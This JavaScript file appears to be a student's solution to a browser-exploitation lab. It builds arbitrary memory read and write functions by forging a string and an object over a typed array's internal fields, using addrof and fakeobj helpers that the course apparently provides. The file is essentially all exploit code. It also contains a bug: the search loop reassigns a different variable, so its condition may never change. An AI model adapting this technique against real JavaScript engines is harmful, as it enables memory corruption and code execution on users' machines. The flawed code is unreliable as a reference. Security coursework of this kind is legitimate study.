/*
 * TODO: Part B solution goes here!
 */
let data = new Uint32Array(1);
let strfront = String.fromCharCode(1, 0, 0, 0, 0, 225, 245, 5, 0, 0, 0, 0, 0, 0, 0, 0);
let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);

let originarray = new Uint32Array(72);
while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 9999944) {
    array = new Uint32Array(72);
}

let offset = cs361s.addrof(originarray) - (cs361s.addrof(fakestring) + 16);
let codes = new Uint8Array(72);

var index = 0;
while(index < codes.length){
    codes[index] = fakestring.charCodeAt(offset + index);
    index++;
}

var fb = 0;
while(fb < 8) {
    var bit = 0;
    let temp = cs361s.addrof(data);
    while(bit < fb) {
        temp = (temp - codes[72 - 16 + bit])/256;
        bit++;
    }   
    codes[72 - 16 + fb] = temp % 256;
    fb++;
}

let cc = String.fromCharCode(...codes)
let control = cs361s.fakeobj(cs361s.addrof(cc) + 16);

let editmem = function(addr) {
    let num = Math.pow(2, 32);
    control[14] = addr % num;
    control[15] = ((addr - control[0]) / num);
};

let readmem = function(addr) {
    editmem(addr);
    return data[0];
};

let writemem = function(addr, val) {
    editmem(addr);
    data[0] = val;
};
